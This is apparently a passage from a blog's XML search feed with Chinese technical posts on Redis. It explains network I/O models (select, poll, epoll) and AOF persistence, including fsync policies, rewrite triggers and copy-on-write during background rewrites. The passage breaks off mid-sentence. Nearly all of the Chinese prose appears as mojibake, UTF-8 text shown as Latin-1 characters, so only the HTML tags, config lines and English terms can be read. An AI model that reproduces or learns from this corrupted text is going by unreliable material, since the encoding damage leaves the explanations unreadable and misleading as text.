¸èƒ½å¤Ÿæ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚æ•°æ®ï¼Œå¹¶ä¸”å‘é€åˆ°ç›¸åº”çš„åº”ç”¨ç¨‹åº</li><li>æœåŠ¡ç«¯è°ƒç”¨listen()å‡½æ•°ï¼Œå¼€å§‹ç›‘å¬ç«¯å£,å®¢æˆ·ç«¯é€šè¿‡è°ƒç”¨connect()å‡½æ•°ï¼Œç»‘å®šæœåŠ¡ç«¯çš„IPã€ç«¯å£å·ï¼Œè¿›è¡ŒTCPä¸‰æ¬¡æ¡æ‰‹.æ¡æ‰‹æˆåŠŸåï¼Œä¼šå°†<strong>å·²å®Œæˆè¿æ¥çš„socket</strong>ï¼Œæ”¾å…¥æœåŠ¡ç«¯å†…æ ¸çš„TCPå…¨è¿æ¥é˜Ÿåˆ—ä¸­</li><li>æœåŠ¡ç«¯é€šè¿‡è°ƒç”¨accept()å‡½æ•°ï¼Œä»å†…æ ¸è·å–å·²å®Œæˆè¿æ¥çš„socketè¿›è¡Œé€šä¿¡,è‹¥TCPå…¨è¿æ¥é˜Ÿåˆ—ä¸­ï¼Œæ— å·²å®Œæˆè¿æ¥çš„socketï¼Œé‚£ä¹ˆå°±ä¼šé˜»å¡ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥çš„åˆ°æ¥</li></ul><p>åŸºäºTCPåè®®çš„socketé€šä¿¡ï¼Œæ˜¯<strong>åŒæ­¥é˜»å¡</strong>çš„ï¼Œå½“æœåŠ¡ç«¯è¿˜æ²¡å¤„ç†å®Œä¸€ä¸ªå®¢æˆ·ç«¯çš„ç½‘ç»œ I/O ï¼Œæˆ–è€…è¯»å†™æ“ä½œå‘ç”Ÿé˜»å¡ï¼Œå…¶ä»–å®¢æˆ·ç«¯æ˜¯æ— æ³•ä¸æœåŠ¡ç«¯è¿æ¥çš„,å³æœåŠ¡ç«¯åªèƒ½ä¸å®¢æˆ·ç«¯è¿›è¡Œä¸€å¯¹ä¸€è¿æ¥é€šä¿¡ï¼Œä¸€ä¸ªæœåŠ¡ç«¯åªèƒ½æœåŠ¡ä¸€ä¸ªå®¢æˆ·ï¼Œå¾ˆä½æ•ˆ</p><h4 id="åŸºäºå¤šè¿›ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI-O"><a href="#åŸºäºå¤šè¿›ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI-O" class="headerlink" title="åŸºäºå¤šè¿›ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI/O"></a>åŸºäºå¤šè¿›ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI/O</h4><p>è¦æƒ³å®ç°æœåŠ¡ç«¯åŒæ—¶æœåŠ¡å¤šä¸ªå®¢æˆ·ç«¯ï¼Œæœ€åŸå§‹çš„æ–¹å¼å°±æ˜¯ç”¨å¤šè¿›ç¨‹ï¼Œå³ä¸ºæ¯ä¸€ä¸ªå®¢æˆ·ç«¯åˆ†é…ä¸€ä¸ªè¿›ç¨‹æ¥å¤„ç†è¯·æ±‚ã€‚æ¯å½“æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯å®Œæˆè¿æ¥ï¼Œè°ƒç”¨accept()å‡½æ•°è¿”å›ä¸€ä¸ªå·²å®Œæˆè¿æ¥çš„socketï¼Œä¸»è¿›ç¨‹å°±ä¼šé€šè¿‡fork()è°ƒç”¨ï¼Œäº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œä¸å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡</p><p>è¿™æ ·è™½ç„¶è§£å†³äº†åªèƒ½æœåŠ¡äºä¸€ä¸ªå®¢æˆ·ç«¯çš„é—®é¢˜ï¼Œä½†æ˜¯å› ä¸ºæ¯äº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå¿…ä¼šå æ®ä¸€å®šçš„ç³»ç»Ÿèµ„æºï¼Œè€Œä¸”è¿›ç¨‹é—´ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ä»£ä»·å¾ˆå¤§ï¼Œæ€§èƒ½å¤§æ‰“æŠ˜æ‰£ã€‚</p><h4 id="åŸºäºå¤šçº¿ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI-O"><a href="#åŸºäºå¤šçº¿ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI-O" class="headerlink" title="åŸºäºå¤šçº¿ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI/O"></a>åŸºäºå¤šçº¿ç¨‹æ¨¡å‹æ”¹è¿›ç½‘ç»œI/O</h4><p>æ”¹è¿›å¤šè¿›ç¨‹ä»£ä»·é«˜çš„ç¼ºç‚¹ï¼Œä½¿ç”¨å¤šçº¿ç¨‹æ¨¡å‹æ¥æœåŠ¡äºå®¢æˆ·ç«¯<br>çº¿ç¨‹æ˜¯è¿è¡Œåœ¨è¿›ç¨‹çš„æ‰§è¡Œæµï¼Œæ‰€ä»¥å¯ä»¥å…±äº«è¿›ç¨‹çš„å¾ˆå¤šèµ„æºï¼Œå¯¹äºä¸€äº›ç§æœ‰æ•°æ®ï¼Œæ‰éœ€è¦è¿›è¡Œçº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå‡å°‘äº†å¾ˆå¤šå¼€é”€ã€‚<br>é€šè¿‡çº¿ç¨‹æ± ï¼Œæ¥é¿å…é¢‘ç¹çš„åˆ›å»ºçº¿ç¨‹ï¼Œé”€æ¯çº¿ç¨‹ã€‚æé«˜æ€§èƒ½</p><p>ä½†æ˜¯è¿˜ä¸å¤Ÿå®Œç¾ï¼Œå› ä¸ºæœ¬è´¨ä¸Šï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡ï¼Œè¿˜æ˜¯åŸºäºä¸€å¯¹ä¸€çš„æ–¹å¼ï¼Œåªä¸è¿‡æ¨¡å‹ç¼©å°ä¸ºçº¿ç¨‹,èƒ½ä¸èƒ½è®©ä¸€ä¸ªè¿›ç¨‹åŒæ—¶ä¸å¤šä¸ªsocketè¿›è¡Œé€šä¿¡å‘¢ï¼Ÿ</p><h4 id="å¼•å…¥I-Oå¤šè·¯å¤ç”¨æ¨¡å‹"><a href="#å¼•å…¥I-Oå¤šè·¯å¤ç”¨æ¨¡å‹" class="headerlink" title="å¼•å…¥I/Oå¤šè·¯å¤ç”¨æ¨¡å‹"></a>å¼•å…¥I/Oå¤šè·¯å¤ç”¨æ¨¡å‹</h4><p>ä¸€ä¸ªè¿›ç¨‹ï¼Œå¯ä»¥ç»´æŠ¤å¤šä¸ªå·²å®Œæˆè¿æ¥çš„socket</p><p><code>è¿›ç¨‹æ€ä¹ˆçŸ¥é“ï¼Œå“ªä¸ªsocketæœ‰äº‹ä»¶è¯·æ±‚å‘¢ï¼Ÿ</code><br>å†…æ ¸æä¾›äº†ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œselect()/poll()/epoll()ï¼Œç”¨æˆ·æ€çš„è¿›ç¨‹é€šè¿‡è°ƒç”¨è¿™äº›å‡½æ•°ï¼Œå°±å¯ä»¥å¾—çŸ¥ï¼Œå“ªäº›socketæœ‰äº‹ä»¶è¯·æ±‚ã€‚</p><p><strong>select()/poll()</strong>:</p><p>æœ¬è´¨éƒ½æ˜¯åœ¨ç”¨æˆ·æ€çº¿æ€§å­˜å‚¨socketæ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œå½“è°ƒç”¨å‡½æ•°select()/poll()æ—¶ï¼Œä¼šå°†å­˜å‚¨çš„é›†åˆæ‹·è´åˆ°å†…æ ¸ï¼Œå†…æ ¸é€šè¿‡éå†åˆ¤æ–­ï¼Œå“ªäº›socketæœ‰äº‹ä»¶è¯·æ±‚ï¼Œå…·ä½“åˆ†ä¸ºè¯»/å†™äº‹ä»¶ï¼Œè¿›è¡Œç›¸åº”çš„æ ‡è®°ã€‚</p><p>å†…æ ¸æ ‡è®°å®Œæˆåï¼Œå°†é›†åˆæ‹·è´å›ç”¨æˆ·æ€ï¼Œç”¨æˆ·æ€é€šè¿‡éå†çš„æ–¹å¼ï¼ŒæŸ¥çœ‹å“ªäº›æ–‡ä»¶æè¿°ç¬¦è¢«æ ‡è®°ï¼Œè¿›è€Œå¾—çŸ¥å“ªäº›socketæœ‰äº‹ä»¶è¯·æ±‚ï¼Œå…·ä½“åˆ†ä¸ºè¯»/å†™äº‹ä»¶ï¼Œè¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚</p><p>ç¼ºç‚¹ï¼š<br>å¯¹äº select()/poll() æ–¹å¼ï¼Œéœ€è¦è¿›è¡Œ 2 æ¬¡ã€Œéå†ã€æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œä¸€æ¬¡æ˜¯åœ¨å†…æ ¸æ€é‡Œï¼Œä¸€æ¬¡æ˜¯åœ¨ç”¨æˆ·æ€é‡Œï¼Œè¿˜ä¼šå‘ç”Ÿ 2 æ¬¡ã€Œæ‹·è´ã€æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œå…ˆä»ç”¨æˆ·ç©ºé—´ä¼ å…¥å†…æ ¸ç©ºé—´ï¼Œç”±å†…æ ¸æ ‡è®°åï¼Œå†ä¼ å‡ºåˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚</p><p>æ˜¾è€Œæ˜“è§ï¼Œéšç€å¹¶å‘æ•°é‡æç¤ºï¼Œæ‹·è´ &amp; éå† äº§ç”Ÿçš„æ€§èƒ½æ¶ˆè€—ï¼Œå°†ä¼šéå¸¸å¤§ã€‚</p><p><strong>epoll()</strong>:<br>epoll()å‡½æ•°ï¼Œä¸åŒäºä»¥ä¸Šä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„åœ°æ–¹åœ¨äº: åœ¨å†…æ ¸ä¸­ä¼šç”¨çº¢é»‘æ ‘ç»“æ„ï¼Œä¿å­˜è¿›ç¨‹ç»´æŠ¤çš„socketæ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œå³å°†å·²å®Œæˆè¿æ¥çš„socketï¼Œé€šè¿‡epoll_ctl() å‡½æ•°åŠ å…¥å†…æ ¸ä¸­çš„çº¢é»‘æ ‘é‡Œ, çº¢é»‘æ ‘è¿›è¡ŒæŸ¥æ‰¾ã€æ·»åŠ ã€åˆ é™¤çš„æ—¶é—´å¤æ‚åº¦éƒ½ä¸ºlog(N)ï¼Œæ€§èƒ½å¥½</p><p>å¹¶ä¸”åœ¨å†…æ ¸ä¸­ï¼Œä¼šç»´æŠ¤ä¸€ä¸ªæœ‰äº‹ä»¶å‘ç”Ÿçš„socketé“¾è¡¨ï¼Œç”¨æˆ·æ€è¿›ç¨‹é€šè¿‡epoll_wait()å‡½æ•°ï¼Œå³å¯å¾—åˆ°æœ‰äº‹ä»¶å‘ç”Ÿçš„socket,èŠ‚çœäº†ç”¨æˆ·æ€ä¸å†…æ ¸æ€è¿›è¡Œéå†çš„è¿‡ç¨‹ï¼Œæå‡æ€§èƒ½</p><p>é‡‡ç”¨ epoll æ¨¡å‹è¿›è¡Œç½‘ç»œI/Oï¼Œè¢«ç§°ä¸ºè§£å†³ <strong>C10K</strong> é—®é¢˜çš„åˆ©å™¨ï¼š<br>æ”¯æŒä¸€ä¸ªè¿›ç¨‹æ‰“å¼€å¤§æ•°ç›®çš„socketæè¿°ç¬¦(FD),å®ƒæ‰€æ”¯æŒçš„FDä¸Šé™æ˜¯æœ€å¤§å¯ä»¥æ‰“å¼€æ–‡ä»¶çš„æ•°ç›®</p><p>IOæ•ˆç‡ä¸éšFDæ•°ç›®å¢åŠ è€Œçº¿æ€§ä¸‹é™, select/pollæ¯æ¬¡è°ƒç”¨éƒ½ä¼šçº¿æ€§è½®è¯¢æ‰«æå…¨éƒ¨çš„fdé›†åˆï¼Œå¯¼è‡´æ•ˆç‡å‘ˆç°çº¿æ€§ä¸‹é™ã€‚epollä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå®ƒåªä¼šå¯¹<code>æ´»è·ƒ</code>çš„socketè¿›è¡Œæ“ä½œï¼Œè¿™æ˜¯å› ä¸ºåœ¨å†…æ ¸å®ç°ä¸­epollæ˜¯æ ¹æ®æ¯ä¸ªfdä¸Šé¢çš„å›è°ƒå‡½æ•°å®ç°çš„</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisæŒä¹…åŒ–(AOF|RDB)</title>
      <link href="/2024/04/12/2024-4-12-redis%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2024/04/12/2024-4-12-redis%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="RedisæŒä¹…åŒ–-AOF-RDB"><a href="#RedisæŒä¹…åŒ–-AOF-RDB" class="headerlink" title="RedisæŒä¹…åŒ–(AOF|RDB)"></a>RedisæŒä¹…åŒ–(AOF|RDB)</h2><h3 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h3><h4 id="AOFæ˜¯ä»€ä¹ˆ"><a href="#AOFæ˜¯ä»€ä¹ˆ" class="headerlink" title="AOFæ˜¯ä»€ä¹ˆ?"></a>AOFæ˜¯ä»€ä¹ˆ?</h4><p>AOFå…¨ç§°æ˜¯append only file, å³åªè¿½åŠ æ–‡ä»¶ã€‚</p><p>AOFæŒä¹…åŒ–æ˜¯é€šè¿‡ä¿å­˜RedisæœåŠ¡å™¨æ‰§è¡Œçš„å†™å‘½ä»¤æ¥è®°å½•æ•°æ®åº“çŠ¶æ€çš„ã€‚</p><p>AOFé»˜è®¤æ˜¯ä¸å¼€å¯çš„,,éœ€è¦åœ¨redis.confæ–‡ä»¶ä¸­é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">appendonly yes</span><br><span class="line">appendfilename &quot;appendonly.aof&quot;</span><br></pre></td></tr></table></figure><p>AOFæŒä¹…åŒ–é…ç½®é¡¹è¯´æ˜ï¼š</p><ul><li>appendonlyï¼šæ˜¯å¦å¼€å¯AOFæŒä¹…åŒ–</li><li>appendfilenameï¼šæŒä¹…åŒ–æ–‡ä»¶å</li></ul><p>rediså¤„ç†å†™å‘½ä»¤çš„æ—¶,ä¼šé‡‡å–å…ˆå†™å†…å­˜æ•°æ®,å†è®°å½•AOFæ—¥å¿—çš„æ–¹å¼,è¿™æ ·åšæœ‰ä¸¤ä¸ªå¥½å¤„:</p><ul><li>å‡å°‘é¢å¤–æ£€æŸ¥å¼€é”€: åªæœ‰å†…å­˜æ•°æ®è¢«ä¿®æ”¹æˆåŠŸåæ‰ä¼šå†™AOFæ—¥å¿—,ä¿è¯äº†æ—¥å¿—éƒ½æ˜¯å¯æ‰§è¡Œä¸”æ­£ç¡®çš„</li><li>ä¸ä¼šé˜»å¡å½“å‰çš„å†™æ“ä½œ</li></ul><p><strong>é£é™©</strong></p><p>å¦‚æœå‘½ä»¤æ‰§è¡Œå®Œæˆï¼Œå†™æ—¥å¿—ä¹‹å‰å®•æœºäº†ï¼Œä¼šä¸¢å¤±æ•°æ®ã€‚</p><p>å¯èƒ½ä¼šé˜»å¡ä¸‹ä¸€æ¡å†™å‘½ä»¤çš„æ‰§è¡Œ: å†™æ“ä½œå’Œè®°å½•æ—¥å¿—éƒ½æ˜¯ä¸»è¿›ç¨‹(ä¸»è¿›ç¨‹ä¸­çš„redis_aof_write_threadçº¿ç¨‹),å¦‚æœåœ¨åˆ·ç›˜æ—¶,æœåŠ¡å™¨I/Oå‹åŠ›è¿‡å¤§,å¯¼è‡´å†™ç¡¬ç›˜é€Ÿåº¦å¾ˆæ…¢,å°±ä¼šé˜»å¡åç»­çš„å†™å‘½ä»¤</p><h4 id="å†™AOFæ—¥å¿—çš„è¿‡ç¨‹"><a href="#å†™AOFæ—¥å¿—çš„è¿‡ç¨‹" class="headerlink" title="å†™AOFæ—¥å¿—çš„è¿‡ç¨‹"></a>å†™AOFæ—¥å¿—çš„è¿‡ç¨‹</h4><p>redisåœ¨æ‰§è¡Œå®Œä¸€ä¸ªå†™å‘½ä»¤ä¹‹åï¼Œä¼šä»¥åè®®æ ¼å¼å°†è¢«æ‰§è¡Œçš„å†™å‘½ä»¤è¿½åŠ åˆ°æ—¥å¿—ç¼“å­˜server.aof_bufä¸­,æ¥ä¸‹æ¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨write(),å°†æ—¥å¿—ç¼“å­˜server.aof_bufä¸­çš„å†…å®¹å†™å…¥åˆ°AOFæ–‡ä»¶ä¸­ã€‚</p><p>æœ‰ä¸‰ç§å†™å›ç­–ç•¥,éœ€è¦é€šè¿‡è®¾ç½®redis.confæ–‡ä»¶ä¸­appendfsyncå‚æ•°æ¥é…ç½®ï¼š</p><p>AOFæŒä¹…åŒ–é…ç½®é¡¹è¯´æ˜ï¼š</p><ul><li>appendfsyncï¼šæŒä¹…åŒ–ç­–ç•¥<ul><li>alwaysï¼šæ¯ä¸ªå†™å‘½ä»¤æ‰§è¡Œå®Œï¼Œç«‹é©¬åŒæ­¥åœ°å°†æ—¥å¿—å†™å›ç£ç›˜ï¼Œæ•°æ®å®‰å…¨æ€§æœ€é«˜ï¼Œä½†æ€§èƒ½æœ€å·®</li><li>everysecï¼šæ¯ä¸ªå†™å‘½ä»¤æ‰§è¡Œå®Œï¼Œåªæ˜¯å…ˆæŠŠæ—¥å¿—å†™åˆ°AOFæ–‡ä»¶çš„å†…å­˜ç¼“å†²åŒºï¼Œ<code>redisçš„åå°å¼‚æ­¥çº¿ç¨‹</code>æ¯éš”ä¸€ç§’æŠŠç¼“å†²åŒºä¸­çš„å†…å®¹å†™å…¥ç£ç›˜</li><li>noï¼šæ¯ä¸ªå†™å‘½ä»¤æ‰§è¡Œå®Œï¼Œåªæ˜¯å…ˆæŠŠæ—¥å¿—å†™åˆ°AOFæ–‡ä»¶çš„å†…å­˜ç¼“å†²åŒºï¼Œç”±<code>æ“ä½œç³»ç»Ÿ</code>å†³å®šä½•æ—¶å°†ç¼“å†²åŒºå†…å®¹å†™å›ç£ç›˜</li></ul></li></ul><h4 id="AOFé‡å†™"><a href="#AOFé‡å†™" class="headerlink" title="AOFé‡å†™"></a>AOFé‡å†™</h4><p>AOFé‡å†™æ˜¯æŒ‡å¯¹AOFæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œåªä¿ç•™å¯ä»¥æ¢å¤æ•°æ®çš„æœ€å°å‘½ä»¤é›†åˆ,å¯ä»¥æœ‰æ•ˆå‡å°AOFæ–‡ä»¶çš„ä½“ç§¯ï¼Œä»¥æå‡æ•°æ®æ¢å¤çš„æ€§èƒ½ã€‚</p><p>é‡å†™è§¦å‘çš„æ¡ä»¶:</p><ul><li><code>auto-aof-rewrite-min-size</code>:è¡¨ç¤ºè¿è¡ŒAOFé‡å†™æ—¶æ–‡ä»¶çš„æœ€å°å¤§å°ï¼Œé»˜è®¤ä¸º64MBã€‚</li><li><code>auto-aof-rewrite-percentage</code>:è¿™ä¸ªå€¼çš„è®¡ç®—æ–¹å¼æ˜¯ï¼Œå½“å‰aofæ–‡ä»¶å¤§å°å’Œä¸Šä¸€æ¬¡é‡å†™åaofæ–‡ä»¶å¤§å°çš„å·®å€¼ï¼Œå†é™¤ä»¥ä¸Šä¸€æ¬¡é‡å†™åaofæ–‡ä»¶å¤§å°ã€‚ä¹Ÿå°±æ˜¯å½“å‰aofæ–‡ä»¶æ¯”ä¸Šä¸€æ¬¡é‡å†™åaofæ–‡ä»¶çš„å¢é‡å¤§å°ï¼Œå’Œä¸Šä¸€æ¬¡é‡å†™åaofæ–‡ä»¶å¤§å°çš„æ¯”å€¼ã€‚</li></ul><p><strong>æµç¨‹</strong>:è¯»å–å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹ï¼Œç„¶åå°†æ¯ä¸€ä¸ªé”®å€¼å¯¹ç”¨ä¸€æ¡å‘½ä»¤è®°å½•åˆ°<code>æ–°çš„ AOF æ–‡ä»¶</code>ï¼Œç­‰åˆ°å…¨éƒ¨è®°å½•å®Œåï¼Œå°±å°†æ–°çš„ AOF æ–‡ä»¶æ›¿æ¢æ‰ç°æœ‰çš„ AOF æ–‡ä»¶</p><p><strong>ä¸ºä»€ä¹ˆè¦æ–°å»ºä¸€ä¸ªAOFæ–‡ä»¶?</strong><br>å¦‚æœåœ¨åŸå…ˆçš„AOFæ–‡ä»¶è¿›è¡Œé‡å†™,å¦‚æœé‡å†™å¤±è´¥,å°±ä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´,å¯¼è‡´æ±¡æŸ“,å¯èƒ½æ— æ³•ç”¨äºæ¢å¤</p><p><code>ä¸ºä»€ä¹ˆæ˜¯åå°å­è¿›ç¨‹è€Œä¸ç”¨å­çº¿ç¨‹?</code><br>å­çº¿ç¨‹ä¼šå…±äº«å†…å­˜,ä¸»è¿›ç¨‹è¦å†™,å­çº¿ç¨‹è¦è¯»,è¦åŠ é”é˜²æ­¢è¯»å†™å¹¶å‘æ“ä½œ,æ€§èƒ½å·®</p><p><strong>é‡‡ç”¨å­è¿›ç¨‹ï¼Œå†™æ—¶å¤åˆ¶æé«˜æ€§èƒ½:</strong><br>é‡‡ç”¨å­è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹ä¼šä¸ºå­è¿›ç¨‹åˆ†é…ä¸ä¸»è¿›ç¨‹ç›¸åŒçš„é¡µè¡¨ï¼Œå³è™šæ‹Ÿç©ºé—´æ˜ å°„åˆ°ç›¸åŒçš„ç‰©ç†ç©ºé—´ï¼Œè¾¾åˆ°æ•°æ®å…±äº«ï¼Œå¹¶ä¸”ä¸éœ€è¦åŠ é”æ“ä½œ.ä½†ä¼šå¯¹è¿™å—å…±äº«çš„ç‰©ç†å†…å­˜è®¾ç½®ä¸ºåªè¯»çŠ¶æ€,å¦‚æœä¸»è¿›ç¨‹ æˆ– å­è¿›ç¨‹ å¯¹è¿™å—å†…å­˜å‘ç”Ÿå†™æ“ä½œï¼Œä¼šè§¦å‘å†™æ—¶å¤åˆ¶.CPU è§¦å‘å†™ä¿æŠ¤ä¸­æ–­ï¼Œè¿™ä¸ªå†™ä¿æŠ¤ä¸­æ–­æ˜¯ç”±äºè¿åæƒé™å¯¼è‡´çš„ï¼Œç„¶åæ“ä½œç³»ç»Ÿä¼šåœ¨ã€Œå†™ä¿æŠ¤ä¸­æ–­å¤„ç†å‡½æ•°ã€é‡Œè¿›è¡Œç‰©ç†å†…å­˜çš„å¤åˆ¶ï¼Œå¹¶é‡æ–°è®¾ç½®å…¶å†…å­˜æ˜ å°„å…³ç³»ï¼Œå°†çˆ¶å­è¿›ç¨‹çš„å†…å­˜è¯»å†™æƒé™è®¾ç½®ä¸ºå¯è¯»å†™ï¼Œæœ€åæ‰ä¼šå¯¹å†…å­˜è¿›è¡Œå†™æ“ä½œ,è¿™æ ·å°±é¿å…äº†åŠ é”æ“ä½œï¼Œé€šè¿‡å†™æ—¶å¤åˆ¶ï¼Œæ¥æé«˜æ€§èƒ½.(ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœä¸»è¿›ç¨‹åœ¨å­è¿›ç¨‹è¿›è¡ŒAOFé‡å†™æ—¶,æ²¡æœ‰æ‰§è¡Œå†™å…¥æ“ä½œ,å°±ä¸ä¼šçœŸæ­£åˆ†é…å†…å­˜èµ„æº,å°±æ˜¯å†™æ—¶å¤åˆ¶æŠ€æœ¯COWçš„åº”ç”¨)</p><h4 id="AOFåå°é‡å†™æœºåˆ¶æè¿°"><a href="#AOFåå°é‡å†™æœºåˆ¶æè¿°" class="headerlink" title="AOFåå°é‡å†™æœºåˆ¶æè¿°"></a>AOFåå°é‡å†™æœºåˆ¶æè¿°</h4><p>è¿›è¡ŒAOFæ—¥å¿—åå°é‡å†™æ—¶ï¼Œä¸»è¿›ç¨‹forkå­è¿›ç¨‹ï¼Œå¹¶ä¸”ä¸ºå­è¿›ç¨‹åˆ†é…ä¸ä¸»è¿›ç¨‹ç›¸åŒçš„é¡µè¡¨ï¼Œå³è™šæ‹Ÿç©ºé—´æ˜ å°„åˆ°ç›¸åŒçš„ç‰©ç†ç©ºé—´ï¼Œè¾¾åˆ°æ•°æ®å…±äº«ï¼Œå¹¶ä¸”é€šè¿‡å†™æ—¶å¤åˆ¶ï¼Œæ¥é¿å…åŠ é”</p><p>å­è¿›ç¨‹æ”¶é›†å†…å­˜ä¸­çš„é”®å€¼å¯¹è½¬åŒ–ä¸ºä¸€æ¡å‘½ä»¤ï¼Œå†™å…¥æ–°çš„AOFæ–‡ä»¶ï¼Œä½†åœ¨å†™å…¥è¿‡ç¨‹ï¼Œä¸»è¿›ç¨‹ä»ç„¶å¯ä»¥å¤„ç†å‘½ä»¤ï¼Œå½“ç¢°åˆ°å†™æ“ä½œå‘½ä»¤æ—¶ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æ“ä½œï¼š<br>è§¦å‘å†™æ—¶å¤åˆ¶è¿‡ç¨‹ï¼ŒCPU è§¦å‘å†™ä¿æŠ¤ä¸­æ–­ï¼Œè¿™ä¸ªå†™ä¿æŠ¤ä¸­æ–­æ˜¯ç”±äºè¿åæƒé™å¯¼è‡´çš„ï¼Œç„¶åæ“ä½œç³»ç»Ÿä¼šåœ¨ã€Œå†™ä¿æŠ¤ä¸­æ–­å¤„ç†å‡½æ•°ã€é‡Œè¿›è¡Œç‰©ç†å†…å­˜çš„å¤åˆ¶ï¼Œå¹¶é‡æ–°è®¾ç½®å…¶å†…å­˜æ˜ å°„å…³ç³»ï¼Œå°†çˆ¶å­è¿›ç¨‹çš„å†…å­˜è¯»å†™æƒé™è®¾ç½®ä¸ºå¯è¯»å†™ï¼Œæœ€åä¸»è¿›ç¨‹æ‰ä¼šå¯¹å†…å­˜è¿›è¡Œå†™æ“ä½œ</p><p><code>ä½†å­è¿›ç¨‹æ”¶é›†çš„AOFæ–‡ä»¶ æ•°æ®å°±ä¸ä¸€è‡´äº†ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</code></p><p>redis åœ¨AOFåå°é‡å†™è§¦å‘æ—¶ï¼Œä¼šåˆ†é…ä¸€ä¸ªAOFé‡å†™ç¼“å†²åŒº,é‡å†™è¿‡ç¨‹ï¼Œä¸»è¿›ç¨‹æ‰§è¡Œæ›´æ–°å†…å­˜æ•°æ®æ—¶ï¼Œéœ€è¦æ‰§è¡Œä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š</p><ol><li>æ‰§è¡Œå‘½ä»¤ï¼Œæ›´æ–°å†…å­˜æ•°æ®</li><li>å°†å‘½ä»¤è®°å½•åˆ°ä¸¤ä¸ªä½ç½®:æ—§çš„AOFæ–‡ä»¶å’ŒAOFé‡å†™ç¼“å†²åŒº</li><li>å½“å­è¿›ç¨‹ AOFé‡å†™å®Œæ¯•ï¼Œä¼šå‘é€ä¸€ä¸ªä¿¡å·å‘Šè¯‰ä¸»è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹è°ƒç”¨ä¿¡å·å¤„ç†å‡½æ•°ä¼šåšä»¥ä¸‹äº‹æƒ…ï¼šå°†AOFé‡å†™ç¼“å†²åŒºçš„æ•°æ®ç›´æ¥è¿½åŠ åˆ°æ–°çš„ AOFæ–‡ä»¶æœ«å°¾ï¼Œæ›¿æ¢æ—§çš„AOFæ–‡ä»¶ï¼Œé‡å†™è¿‡ç¨‹å°±ç»“æŸã€‚ä¿¡å·å¤„ç†å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œä¸»è¿›ç¨‹å°±å¯ä»¥ç»§ç»­å¤„ç†å‘½ä»¤äº†</li></ol><p><code>åå°é‡å†™ï¼Œä»€ä¹ˆé˜¶æ®µä¼šé˜»å¡ä¸»è¿›ç¨‹ï¼Ÿ</code></p><ol><li>åˆ›å»ºå­è¿›ç¨‹çš„é€”ä¸­,ç”±äºè¦å¤åˆ¶çˆ¶è¿›ç¨‹çš„é¡µè¡¨ç­‰æ•°æ®ç»“æ„: é˜»å¡çš„æ—¶é—´è·Ÿé¡µè¡¨çš„å¤§å°æœ‰å…³,é¡µè¡¨è¶Šå¤§,é˜»å¡çš„æ—¶é—´ä¹Ÿè¶Šé•¿</li><li>åˆ›å»ºå®Œå­è¿›ç¨‹å,å¦‚æœçˆ¶è¿›ç¨‹ä¿®æ”¹äº†å…±äº«æ•°æ®ï¼ˆå­è¿›ç¨‹ä¸€èˆ¬åªè¯»ï¼‰,å°±ä¼šå‘ç”Ÿå†™æ—¶å¤åˆ¶,è¿™æœŸé—´ä¼šæ‹·è´ç‰©ç†å†…å­˜,å¦‚æœå†…å­˜è¶Šå¤§,è‡ªç„¶é˜»å¡çš„æ—¶é—´ä¹Ÿè¶Šé•¿</li><li>å­è¿›ç¨‹ AOFé‡å†™å®Œæ¯•,å‘é€ä¿¡å·é€šçŸ¥ä¸»è¿›ç¨‹,ä¸»è¿›ç¨‹ä¼šè°ƒç”¨ä¿¡å·å¤„ç†å‡½æ•°,æ‰§è¡Œæ—¶ä¹Ÿä¼šå¯¹ä¸»è¿›ç¨‹é€ 